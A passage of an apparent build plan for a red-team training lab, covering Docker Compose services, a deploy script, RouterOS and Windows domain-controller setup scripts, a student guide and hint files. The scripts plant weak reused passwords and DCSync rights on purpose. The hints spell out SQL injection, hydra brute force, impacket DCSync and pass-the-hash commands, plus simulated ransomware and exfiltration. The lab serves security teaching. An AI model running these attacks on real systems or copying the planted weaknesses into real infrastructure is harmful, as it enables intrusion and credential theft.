      - "${STUDENT_SSH_PORT:-2200}:22"
    environment:
      - STUDENT_ID=${STUDENT_ID:-99}
    cap_add:
      - NET_ADMIN
    stdin_open: true
    tty: true

  redirector1:
    image: redteam-lab/redirector:latest
    build: ./infrastructure/redirector
    container_name: student${STUDENT_ID:-99}-redir1
    hostname: redirector1
    networks:
      internet:
        ipv4_address: 10.${STUDENT_ID:-99}.0.20
    environment:
      - REDIRECT_CONFIG=8080:wordpress:80,4444:kali:4444
    cap_add:
      - NET_ADMIN
    depends_on:
      - kali

  redirector2:
    image: redteam-lab/redirector:latest
    build: ./infrastructure/redirector
    container_name: student${STUDENT_ID:-99}-redir2
    hostname: redirector2
    networks:
      internet:
        ipv4_address: 10.${STUDENT_ID:-99}.0.21
    environment:
      - REDIRECT_CONFIG=8080:redirector1:8080,4444:redirector1:4444
    cap_add:
      - NET_ADMIN
    depends_on:
      - redirector1

  # === DMZ ===

  mysql:
    image: mysql:8.0
    container_name: student${STUDENT_ID:-99}-mysql
    hostname: mysql
    networks:
      dmz:
        ipv4_address: 10.${STUDENT_ID:-99}.1.20
    environment:
      - MYSQL_ROOT_PASSWORD=r00tdb2024!
      - MYSQL_DATABASE=wordpress
      - MYSQL_USER=wp_user
      - MYSQL_PASSWORD=Acme2024!
    volumes:
      - mysql-data:/var/lib/mysql
      - ./infrastructure/wordpress/mysql-init.sql:/docker-entrypoint-initdb.d/init.sql:ro

  wordpress:
    image: redteam-lab/wordpress:latest
    build: ./infrastructure/wordpress
    container_name: student${STUDENT_ID:-99}-wordpress
    hostname: wordpress
    networks:
      internet:
        ipv4_address: 10.${STUDENT_ID:-99}.0.100
      dmz:
        ipv4_address: 10.${STUDENT_ID:-99}.1.10
    environment:
      - WORDPRESS_DB_HOST=mysql
      - WORDPRESS_DB_USER=wp_user
      - WORDPRESS_DB_PASSWORD=Acme2024!
      - WORDPRESS_DB_NAME=wordpress
      - WORDPRESS_URL=http://10.${STUDENT_ID:-99}.0.100
      - WP_ADMIN_USER=admin
      - WP_ADMIN_PASSWORD=Acme2024!
      - SSH_ADMIN_PASSWORD=Acme2024!
    ports:
      - "${STUDENT_WEB_PORT:-8080}:80"
    depends_on:
      - mysql

  # === INTERNAL NETWORK ===

  fileserver:
    image: redteam-lab/fileserver:latest
    build: ./infrastructure/fileserver
    container_name: student${STUDENT_ID:-99}-fileserver
    hostname: fileserver
    networks:
      internal:
        ipv4_address: 10.${STUDENT_ID:-99}.2.20
    environment:
      - ADMIN_PASSWORD=Acme2024!
      - JSMITH_PASSWORD=Summer2024
      - MWILLIAMS_PASSWORD=Welcome123
      - SVCBACKUP_PASSWORD=Backup2024!

  workstation:
    image: redteam-lab/workstation:latest
    build: ./infrastructure/workstation
    container_name: student${STUDENT_ID:-99}-workstation
    hostname: workstation
    networks:
      internal:
        ipv4_address: 10.${STUDENT_ID:-99}.2.30
      dmz:
        ipv4_address: 10.${STUDENT_ID:-99}.1.30
    environment:
      - WORDPRESS_URL=http://10.${STUDENT_ID:-99}.1.10
      - BROWSE_INTERVAL=60
    depends_on:
      - wordpress

  # === ROUTER (connects all networks) ===
  # Note: RouterOS requires a VM, this is a placeholder Linux router

  router:
    image: alpine:3.19
    container_name: student${STUDENT_ID:-99}-router
    hostname: router
    networks:
      internet:
        ipv4_address: 10.${STUDENT_ID:-99}.0.1
      dmz:
        ipv4_address: 10.${STUDENT_ID:-99}.1.1
      internal:
        ipv4_address: 10.${STUDENT_ID:-99}.2.1
    cap_add:
      - NET_ADMIN
    command: >
      sh -c "
        apk add --no-cache iptables openssh socat &&
        echo 1 > /proc/sys/net/ipv4/ip_forward &&
        iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE &&
        echo 'root:Mikr0t1k!' | chpasswd &&
        ssh-keygen -A &&
        /usr/sbin/sshd &&
        tail -f /dev/null
      "

volumes:
  kali-home:
  mysql-data:
```

**Step 2: Create .env.template**

```bash
# .env.template
# Copy to .env.studentXX and modify STUDENT_ID

# Student identifier (01-99)
STUDENT_ID=01

# Port mappings (base + student ID)
# Student 01: SSH 2201, Web 8001
# Student 02: SSH 2202, Web 8002
STUDENT_SSH_PORT=2201
STUDENT_WEB_PORT=8001
```

**Step 3: Test compose syntax**

Run: `docker compose config > /dev/null && echo "Compose file valid"`
Expected: "Compose file valid"

**Step 4: Commit**

```bash
git add docker-compose.yml .env.template && git commit -m "feat: add Docker Compose orchestration"
```

---

### Task 11: Create Deploy Script

**Files:**
- Create: `deploy.sh`

**Step 1: Create deploy script**

```bash
#!/bin/bash
# deploy.sh - Student environment management

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

usage() {
    cat <<EOF
Red Team Training Lab - Deployment Script

Usage: $0 <command> [student_id]

Commands:
    create <id>     Create a new student environment (e.g., create 01)
    destroy <id>    Tear down a student environment
    reset <id>      Destroy and recreate environment
    start <id>      Start a stopped environment
    stop <id>       Stop a running environment
    status          Show status of all environments
    build           Build all Docker images
    logs <id>       Show logs for a student environment

Examples:
    $0 build                    # Build all images first
    $0 create 01                # Create student01 environment
    $0 status                   # Check all environments
    $0 reset 03                 # Reset student03 environment
EOF
    exit 1
}

validate_student_id() {
    local id=$1
    if [[ ! "$id" =~ ^[0-9]{2}$ ]]; then
        echo "Error: Student ID must be two digits (01-99)"
        exit 1
    fi
    if [[ "$id" -lt 1 || "$id" -gt 99 ]]; then
        echo "Error: Student ID must be between 01 and 99"
        exit 1
    fi
}

calculate_ports() {
    local id=$1
    # Remove leading zero for arithmetic
    local num=$((10#$id))
    SSH_PORT=$((2200 + num))
    WEB_PORT=$((8000 + num))
}

create_env_file() {
    local id=$1
    calculate_ports "$id"

    cat > ".env.student${id}" <<EOF
STUDENT_ID=${id}
STUDENT_SSH_PORT=${SSH_PORT}
STUDENT_WEB_PORT=${WEB_PORT}
EOF
    echo "Created .env.student${id}"
}

cmd_build() {
    echo "Building all Docker images..."
    docker compose build
    echo "Build complete!"
}

cmd_create() {
    local id=$1
    validate_student_id "$id"
    calculate_ports "$id"

    echo "Creating student${id} environment..."
    echo "  - SSH port: ${SSH_PORT}"
    echo "  - Web port: ${WEB_PORT}"
    echo "  - Networks: 10.${id}.0.0/24, 10.${id}.1.0/24, 10.${id}.2.0/24"

    create_env_file "$id"

    # Export for docker compose
    export STUDENT_ID="$id"
    export STUDENT_SSH_PORT="$SSH_PORT"
    export STUDENT_WEB_PORT="$WEB_PORT"

    docker compose --env-file ".env.student${id}" -p "student${id}" up -d

    echo ""
    echo "Environment created!"
    echo "  SSH: ssh root@localhost -p ${SSH_PORT} (or use kali container)"
    echo "  Web: http://localhost:${WEB_PORT}"
    echo ""
    echo "Student Kali access:"
    echo "  docker exec -it student${id}-kali /bin/bash"
}

cmd_destroy() {
    local id=$1
    validate_student_id "$id"

    echo "Destroying student${id} environment..."

    if [ -f ".env.student${id}" ]; then
        export STUDENT_ID="$id"
        source ".env.student${id}"
        docker compose --env-file ".env.student${id}" -p "student${id}" down -v --remove-orphans
        rm -f ".env.student${id}"
    else
        # Try to stop anyway
        docker compose -p "student${id}" down -v --remove-orphans 2>/dev/null || true
    fi

    echo "Environment destroyed!"
}

cmd_reset() {
    local id=$1
    cmd_destroy "$id"
    sleep 2
    cmd_create "$id"
}

cmd_start() {
    local id=$1
    validate_student_id "$id"

    if [ ! -f ".env.student${id}" ]; then
        echo "Environment student${id} does not exist. Use 'create' first."
        exit 1
    fi

    export STUDENT_ID="$id"
    source ".env.student${id}"
    docker compose --env-file ".env.student${id}" -p "student${id}" start
}

cmd_stop() {
    local id=$1
    validate_student_id "$id"

    if [ ! -f ".env.student${id}" ]; then
        echo "Environment student${id} does not exist."
        exit 1
    fi

    export STUDENT_ID="$id"
    source ".env.student${id}"
    docker compose --env-file ".env.student${id}" -p "student${id}" stop
}

cmd_status() {
    echo "Red Team Lab - Environment Status"
    echo "=================================="
    echo ""

    # Find all student environments
    for env_file in .env.student*; do
        if [ -f "$env_file" ]; then
            source "$env_file"
            echo "Student ${STUDENT_ID}:"
            echo "  SSH Port: ${STUDENT_SSH_PORT}"
            echo "  Web Port: ${STUDENT_WEB_PORT}"

            # Check container status
            running=$(docker ps --filter "name=student${STUDENT_ID}" --format "{{.Names}}" | wc -l)
            echo "  Containers running: ${running}"
            echo ""
        fi
    done

    if [ ! -f .env.student* ] 2>/dev/null; then
        echo "No student environments found."
        echo "Use '$0 create 01' to create one."
    fi
}

cmd_logs() {
    local id=$1
    validate_student_id "$id"

    export STUDENT_ID="$id"
    docker compose -p "student${id}" logs -f
}

# Main
case "${1:-}" in
    create)
        [ -z "${2:-}" ] && usage
        cmd_create "$2"
        ;;
    destroy)
        [ -z "${2:-}" ] && usage
        cmd_destroy "$2"
        ;;
    reset)
        [ -z "${2:-}" ] && usage
        cmd_reset "$2"
        ;;
    start)
        [ -z "${2:-}" ] && usage
        cmd_start "$2"
        ;;
    stop)
        [ -z "${2:-}" ] && usage
        cmd_stop "$2"
        ;;
    status)
        cmd_status
        ;;
    build)
        cmd_build
        ;;
    logs)
        [ -z "${2:-}" ] && usage
        cmd_logs "$2"
        ;;
    *)
        usage
        ;;
esac
```

**Step 2: Make executable and verify**

Run: `chmod +x deploy.sh && ./deploy.sh`
Expected: Usage help output

**Step 3: Commit**

```bash
git add deploy.sh && git commit -m "feat: add student environment deployment script"
```

---

## Phase 6: RouterOS VM Template

### Task 12: Create RouterOS Packer Template

**Files:**
- Create: `vms/routeros/routeros.pkr.hcl`
- Create: `vms/routeros/provision.rsc`

**Step 1: Create Packer template**

```hcl
# vms/routeros/routeros.pkr.hcl
# MikroTik RouterOS CHR (Cloud Hosted Router) template

packer {
  required_plugins {
    qemu = {
      version = ">= 1.0.0"
      source  = "github.com/hashicorp/qemu"
    }
  }
}

variable "ros_version" {
  type    = string
  default = "7.13.2"
}

variable "student_id" {
  type    = string
  default = "99"
}

source "qemu" "routeros" {
  iso_url          = "https://download.mikrotik.com/routeros/${var.ros_version}/chr-${var.ros_version}.img.zip"
  iso_checksum     = "none"
  output_directory = "output-routeros-${var.student_id}"

  disk_size        = "256M"
  format           = "qcow2"

  accelerator      = "kvm"

  vm_name          = "routeros-student${var.student_id}.qcow2"

  net_device       = "virtio-net"

  ssh_username     = "admin"
  ssh_password     = ""
  ssh_timeout      = "10m"

  boot_wait        = "60s"

  shutdown_command = "/system shutdown"
}

build {
  sources = ["source.qemu.routeros"]

  provisioner "file" {
    source      = "provision.rsc"
    destination = "/provision.rsc"
  }

  provisioner "shell" {
    inline = [
      "/import provision.rsc"
    ]
  }
}
```

**Step 2: Create RouterOS provisioning script**

```routeros
# vms/routeros/provision.rsc
# RouterOS initial configuration for Red Team Lab

# Set identity
/system identity set name="AcmeRouter"

# Configure admin password
/user set [find name=admin] password="Mikr0t1k!"

# Create backup user (weak password for brute force)
/user add name=backup password=backup123 group=full

# Configure interfaces (will be adjusted per deployment)
# eth1 = Internet/External
# eth2 = DMZ
# eth3 = Internal

/interface ethernet
set [ find default-name=ether1 ] name=eth-external
set [ find default-name=ether2 ] name=eth-dmz
set [ find default-name=ether3 ] name=eth-internal

# IP addressing (template - adjusted per student)
/ip address
add address=10.99.0.1/24 interface=eth-external
add address=10.99.1.1/24 interface=eth-dmz
add address=10.99.2.1/24 interface=eth-internal

# Enable SSH
/ip service
set ssh port=22 disabled=no
set www disabled=yes
set www-ssl disabled=yes
set api disabled=yes
set api-ssl disabled=yes
set winbox disabled=no

# Configure L2TP VPN server
/interface l2tp-server server
set enabled=yes default-profile=default-encryption \
    authentication=mschap2 use-ipsec=yes ipsec-secret="AcmeVPN2024"

# Create VPN user profiles
/ppp profile
add name=vpn-users local-address=10.99.100.1 remote-address=vpn-pool \
    dns-server=10.99.2.10

/ip pool
add name=vpn-pool ranges=10.99.100.100-10.99.100.200

# VPN users (matching credentials from WordPress/AD)
/ppp secret
add name=jsmith password="Summer2024" profile=vpn-users service=l2tp
add name=mwilliams password="Welcome123" profile=vpn-users service=l2tp
add name=svc_backup password="Backup2024!" profile=vpn-users service=l2tp

# Basic firewall - allow L2TP
/ip firewall filter
add chain=input protocol=udp port=500,1701,4500 action=accept comment="L2TP/IPSec"
add chain=input protocol=ipsec-esp action=accept
add chain=input connection-state=established,related action=accept
add chain=input action=drop

# NAT for internal networks
/ip firewall nat
add chain=srcnat out-interface=eth-external action=masquerade

# Enable routing between networks
/ip route
add dst-address=0.0.0.0/0 gateway=10.99.0.254

# Logging
/system logging
add topics=l2tp,debug action=memory
add topics=ipsec,debug action=memory
```

**Step 3: Commit**

```bash
git add vms/routeros/ && git commit -m "feat: add RouterOS Packer template with L2TP VPN"
```

---

## Phase 7: Windows DC Template (Documentation)

### Task 13: Create Windows DC Setup Documentation

**Files:**
- Create: `vms/windows/README.md`
- Create: `vms/windows/dc-setup.ps1`

**Step 1: Create README**

```markdown
# vms/windows/README.md

# Windows Domain Controller Setup

Due to licensing requirements, Windows VMs must be manually created or use evaluation versions.

## Option 1: Windows Server Evaluation

1. Download Windows Server 2019 Evaluation from Microsoft:
   https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019

2. Create VM with:
   - 4GB RAM
   - 60GB disk
   - 2 network adapters (DMZ + Internal)

3. Install Windows Server, then run `dc-setup.ps1`

## Option 2: Pre-built Vagrant Box

```bash
vagrant init gusztavvargadr/windows-server-2019-standard
vagrant up
```

Then run the setup script.

## Network Configuration

- NIC1 (Internal): 10.X.2.10/24 (X = student ID)
- DNS: 127.0.0.1
- Gateway: 10.X.2.1

## Post-Setup Verification

1. AD DS is running: `Get-Service NTDS`
2. DNS is working: `Resolve-DnsName acmewidgets.local`
3. Users exist: `Get-ADUser -Filter *`
```

**Step 2: Create PowerShell setup script**

```powershell
# vms/windows/dc-setup.ps1
# Windows Server 2019 Domain Controller Setup for Red Team Lab

param(
    [string]$StudentId = "99",
    [string]$DomainName = "acmewidgets.local",
    [string]$NetBiosName = "ACME",
    [string]$SafeModePassword = "SafeMode2024!"
)

# Requires elevation
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "Run this script as Administrator"
    exit 1
}

Write-Host "=== Red Team Lab - DC Setup ===" -ForegroundColor Cyan
Write-Host "Student ID: $StudentId"
Write-Host "Domain: $DomainName"

# Set static IP
$InternalIP = "10.$StudentId.2.10"
$Gateway = "10.$StudentId.2.1"

Write-Host "Configuring network: $InternalIP" -ForegroundColor Yellow

# Find internal adapter (adjust index as needed)
$adapter = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1
New-NetIPAddress -InterfaceIndex $adapter.ifIndex -IPAddress $InternalIP -PrefixLength 24 -DefaultGateway $Gateway -ErrorAction SilentlyContinue
Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses "127.0.0.1"

# Install AD DS role
Write-Host "Installing AD DS role..." -ForegroundColor Yellow
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Write-Host "Promoting to Domain Controller..." -ForegroundColor Yellow

$SecurePassword = ConvertTo-SecureString $SafeModePassword -AsPlainText -Force

Install-ADDSForest `
    -DomainName $DomainName `
    -DomainNetbiosName $NetBiosName `
    -SafeModeAdministratorPassword $SecurePassword `
    -InstallDNS `
    -Force

# Note: Server will restart after this

Write-Host "Server will restart. Run dc-setup-phase2.ps1 after reboot." -ForegroundColor Green
```

**Step 3: Create Phase 2 script (post-reboot)**

```powershell
# vms/windows/dc-setup-phase2.ps1
# Run after DC promotion and reboot

param(
    [string]$StudentId = "99"
)

Write-Host "=== Red Team Lab - DC Setup Phase 2 ===" -ForegroundColor Cyan

# Wait for AD DS to be ready
Write-Host "Waiting for AD DS..." -ForegroundColor Yellow
while (-not (Get-Service NTDS -ErrorAction SilentlyContinue).Status -eq "Running") {
    Start-Sleep -Seconds 5
}

Import-Module ActiveDirectory

# Create OUs
Write-Host "Creating OUs..." -ForegroundColor Yellow
New-ADOrganizationalUnit -Name "AcmeUsers" -Path "DC=acmewidgets,DC=local" -ErrorAction SilentlyContinue
New-ADOrganizationalUnit -Name "AcmeComputers" -Path "DC=acmewidgets,DC=local" -ErrorAction SilentlyContinue
New-ADOrganizationalUnit -Name "ServiceAccounts" -Path "DC=acmewidgets,DC=local" -ErrorAction SilentlyContinue

# Create Groups
Write-Host "Creating groups..." -ForegroundColor Yellow
New-ADGroup -Name "IT Support" -GroupScope Global -Path "OU=AcmeUsers,DC=acmewidgets,DC=local"
New-ADGroup -Name "Accounting" -GroupScope Global -Path "OU=AcmeUsers,DC=acmewidgets,DC=local"
New-ADGroup -Name "Backup Operators Custom" -GroupScope Global -Path "OU=AcmeUsers,DC=acmewidgets,DC=local"

# Create Users (matching credentials from other systems)
Write-Host "Creating users..." -ForegroundColor Yellow

$users = @(
    @{
        Name = "John Smith"
        SamAccountName = "jsmith"
        Password = "Summer2024"
        Groups = @("IT Support")
        Description = "IT Support Technician"
    },
    @{
        Name = "Mary Williams"
        SamAccountName = "mwilliams"
        Password = "Welcome123"
        Groups = @("Accounting")
        Description = "Accounting Specialist"
    },
    @{
        Name = "Backup Service"
        SamAccountName = "svc_backup"
        Password = "Backup2024!"
        Groups = @("Backup Operators Custom")
        Description = "Backup service account"
        ServiceAccount = $true
    }
)

foreach ($user in $users) {
    $securePass = ConvertTo-SecureString $user.Password -AsPlainText -Force

    $params = @{
        Name = $user.Name
        SamAccountName = $user.SamAccountName
        UserPrincipalName = "$($user.SamAccountName)@acmewidgets.local"
        AccountPassword = $securePass
        Enabled = $true
        PasswordNeverExpires = $true
        Path = "OU=AcmeUsers,DC=acmewidgets,DC=local"
        Description = $user.Description
    }

    if ($user.ServiceAccount) {
        $params.Path = "OU=ServiceAccounts,DC=acmewidgets,DC=local"
    }

    New-ADUser @params -ErrorAction SilentlyContinue

    foreach ($group in $user.Groups) {
        Add-ADGroupMember -Identity $group -Members $user.SamAccountName -ErrorAction SilentlyContinue
    }

    Write-Host "  Created: $($user.SamAccountName)" -ForegroundColor Green
}

# MISCONFIGURATION: Give svc_backup DCSync rights (for training)
Write-Host "Configuring 'misconfigurations' for training..." -ForegroundColor Yellow

# This grants Replicating Directory Changes rights - allows DCSync attack
$acl = Get-Acl "AD:\DC=acmewidgets,DC=local"
$svcBackupSid = (Get-ADUser svc_backup).SID
$replicatingChanges = [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
$replicatingChangesAll = [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"

$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($svcBackupSid, "ExtendedRight", "Allow", $replicatingChanges)
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($svcBackupSid, "ExtendedRight", "Allow", $replicatingChangesAll)

$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl "AD:\DC=acmewidgets,DC=local" $acl

Write-Host "svc_backup now has DCSync rights (misconfiguration for training)" -ForegroundColor Red

# Set Administrator password
$adminPass = ConvertTo-SecureString "Adm1n2024!" -AsPlainText -Force
Set-ADAccountPassword -Identity Administrator -NewPassword $adminPass -Reset

Write-Host ""
Write-Host "=== DC Setup Complete ===" -ForegroundColor Green
Write-Host "Domain: acmewidgets.local"
Write-Host "Admin password: Adm1n2024!"
Write-Host ""
Write-Host "Vulnerable configurations:"
Write-Host "  - svc_backup has DCSync rights"
Write-Host "  - Users have weak passwords"
Write-Host "  - Password reuse across systems"
```

**Step 4: Commit**

```bash
git add vms/windows/ && git commit -m "docs: add Windows DC setup scripts and documentation"
```

---

## Phase 8: Final Integration

### Task 14: Create Student Guide

**Files:**
- Create: `docs/student-guide.md`

**Step 1: Create student guide**

```markdown
# docs/student-guide.md

# Red Team Training Lab - Student Guide

## Mission Briefing

You are a penetration tester hired to assess the security of **Acme Widgets Inc.**, a small manufacturing company. Your objective is to:

1. Gain initial access to the network
2. Move laterally to internal systems
3. Achieve domain administrator access
4. Demonstrate business impact (data theft, ransomware)

## Rules of Engagement

- Target network: 10.X.0.0/8 (where X is your student ID)
- Stay within your assigned network ranges
- Do not attack other students' environments
- Document all findings

## Network Information

| Network | CIDR | Purpose |
|---------|------|---------|
| External | 10.X.0.0/24 | Internet-facing services |
| DMZ | 10.X.1.0/24 | Web servers |
| Internal | 10.X.2.0/24 | Corporate network |

## Known Targets

- Web Server: 10.X.0.100 (WordPress site)
- Router: 10.X.0.1 (VPN gateway)

## Your Attack Box

You're starting from a Kali Linux container with pre-installed tools:

```bash
# Connect to your Kali box
docker exec -it studentXX-kali /bin/bash
```

### Available Tools

| Category | Tools |
|----------|-------|
| Scanning | nmap, nikto, dirb, gobuster |
| Web | sqlmap, burpsuite |
| Passwords | hydra, hashcat, john |
| Exploitation | metasploit, impacket |
| AD | bloodhound, crackmapexec |
| Browser | beef-xss |

### Wordlists

Located at `/usr/share/wordlists/`:
- `rockyou.txt` - Common passwords
- `dirb/common.txt` - Web directories

## Objectives Checklist

### Phase 1: Initial Access
- [ ] Enumerate web application
- [ ] Find SQL injection vulnerability
- [ ] Extract credentials from database
- [ ] Gain shell access via SSH or VPN

### Phase 2: Lateral Movement
- [ ] Connect to internal network
- [ ] Enumerate Active Directory
- [ ] Identify privilege escalation paths

### Phase 3: Domain Dominance
- [ ] Obtain Domain Admin credentials
- [ ] Perform DCSync attack
- [ ] Create persistence

### Phase 4: Impact Demonstration
- [ ] Exfiltrate sensitive data
- [ ] Simulate ransomware deployment
- [ ] Document attack chain

## Hints System

If you're stuck, hints are available:

```bash
# From your Kali box
cat /opt/hints/phase1.txt
cat /opt/hints/phase2.txt
# etc.
```

## Success Criteria

Submit the following to your instructor:

1. **NTLM hash** of `Administrator` or `krbtgt` account
2. **Contents** of `//fileserver/sensitive/secret-formula.txt`
3. **Screenshot** of ransom note on file server

## Report Template

Your final report should include:

1. Executive Summary
2. Methodology
3. Findings (with evidence)
4. Attack Chain Diagram
5. Recommendations

Good luck, operator.
```

**Step 2: Commit**

```bash
git add docs/student-guide.md && git commit -m "docs: add student guide with objectives and hints"
```

---

### Task 15: Create Hint Files

**Files:**
- Create: `infrastructure/kali/hints/`

**Step 1: Create hint files**

```bash
mkdir -p infrastructure/kali/hints
```

```text
# infrastructure/kali/hints/phase1.txt
=== Phase 1 Hints: Initial Access ===

Hint 1: Start with reconnaissance
  - nmap -sV -sC 10.X.0.0/24 10.X.1.0/24

Hint 2: The website has an employee directory
  - Browse to http://10.X.0.100
  - Look for input fields that might not be sanitized

Hint 3: SQL Injection
  - The search function is vulnerable
  - Try: ' OR '1'='1
  - Use sqlmap: sqlmap -u "http://10.X.0.100/employee-directory/?search=test" --dbs

Hint 4: There's more than one database
  - Enumerate all databases, not just WordPress
  - Look for a 'secrets' database

Hint 5: Credentials are reused
  - Passwords from the database work elsewhere
  - Try SSH, try VPN
```

```text
# infrastructure/kali/hints/phase2.txt
=== Phase 2 Hints: Lateral Movement ===

Hint 1: VPN Access
  - L2TP/IPSec VPN is running on the router
  - PSK might be in the database dump

Hint 2: From VPN, you can reach internal network
  - 10.X.2.0/24 is now accessible
  - Look for Windows domain controller

Hint 3: SSH Brute Force
  - hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.X.0.100
  - Or use credentials you already found

Hint 4: Enumerate AD
  - crackmapexec smb 10.X.2.10 -u 'jsmith' -p 'Summer2024' --users
  - BloodHound for attack path analysis
```

```text
# infrastructure/kali/hints/phase3.txt
=== Phase 3 Hints: Domain Dominance ===

Hint 1: Look for service accounts
  - Service accounts often have excessive privileges
  - Check for accounts with DCSync rights

Hint 2: DCSync Attack
  - If you have an account with Replicating Directory Changes rights:
  - impacket-secretsdump acmewidgets.local/svc_backup:Backup2024!@10.X.2.10

Hint 3: Pass the Hash
  - Don't need to crack the hash
  - impacket-psexec -hashes :NTHASH acmewidgets.local/Administrator@10.X.2.10
```

```text
# infrastructure/kali/hints/phase4.txt
=== Phase 4 Hints: Impact ===

Hint 1: Access File Server
  - smbclient //10.X.2.20/sensitive -U 'svc_backup%Backup2024!'
  - Download the secret formula

Hint 2: Ransomware Simulation
  - Create a ransom note: ransom.txt
  - "Your files have been encrypted. Pay 1 BTC to..."
  - Upload to the sensitive share

Hint 3: Exfiltration through redirectors
  - Use your redirector chain to move data out
  - Shows why network monitoring matters
```

**Step 2: Update Kali Dockerfile to include hints**

Add to Dockerfile:
```dockerfile
COPY hints/ /opt/hints/
```

**Step 3: Commit**

```bash
git add infrastructure/kali/hints/ && git commit -m "feat: add progressive hint system for students"
```

---

### Task 16: Final Verification and Documentation

**Files:**
- Update: `README.md`

**Step 1: Create project README**

```markdown
# README.md

# Red Team Training Lab

A scalable cybersecurity training environment for teaching offensive security techniques.

## Quick Start

```bash
# Build all images
./deploy.sh build

# Create a student environment
./deploy.sh create 01

# Access the Kali attack box
docker exec -it student01-kali /bin/bash

# Tear down when done
./deploy.sh destroy 01
```

## Architecture

See [docs/plans/2026-01-15-red-team-training-lab-design.md](docs/plans/2026-01-15-red-team-training-lab-design.md)

## Attack Scenarios

1. **SQL Injection** → Credential Dump → VPN Access
2. **SSH Brute Force** → Server Compromise
3. **XSS/BeEF** → Browser Hooking → Credential Theft

## Requirements

- Docker & Docker Compose
- 8-10GB RAM per student environment
- For RouterOS: KVM-capable host or VMware/Proxmox
- For Windows DC: Windows Server license or evaluation

## Student Guide

See [docs/student-guide.md](docs/student-guide.md)

## Directory Structure

```
├── deploy.sh              # Environment management
├── docker-compose.yml     # Container orchestration
├── infrastructure/        # Container definitions
│   ├── kali/             # Attack box
│   ├── redirector/       # Traffic relay
│   ├── wordpress/        # Vulnerable web app
│   ├── fileserver/       # Samba shares
│   └── workstation/      # BeEF victim
├── vms/                  # VM templates
│   ├── routeros/         # MikroTik VPN gateway
│   └── windows/          # Domain Controller
├── config/               # Shared configuration
└── docs/                 # Documentation
```

## License

For educational purposes only. Do not use for unauthorized access.
```

**Step 2: Commit**

```bash
git add README.md && git commit -m "docs: add project README"
```

**Step 3: Verify everything builds**

```bash
./deploy.sh build
```

**Step 4: Test environment creation**

```bash
./deploy.sh create 01
./deploy.sh status
./deploy.sh destroy 01
```

---

## Summary

This plan implements:

1. **Attacker Infrastructure**: Kali box + 2 redirectors
2. **Vulnerable Web App**: WordPress with SQLi/XSS plugin
3. **Network Segmentation**: Internet/DMZ/Internal networks
4. **Target Systems**: File server with sensitive data, workstation for BeEF
5. **VM Templates**: RouterOS (L2TP VPN), Windows DC (with misconfigs)
6. **Deployment**: Per-student Docker Compose with deploy script
7. **Student Experience**: Guide, hints, clear objectives

Total tasks: 16
Estimated implementation time: Varies based on familiarity
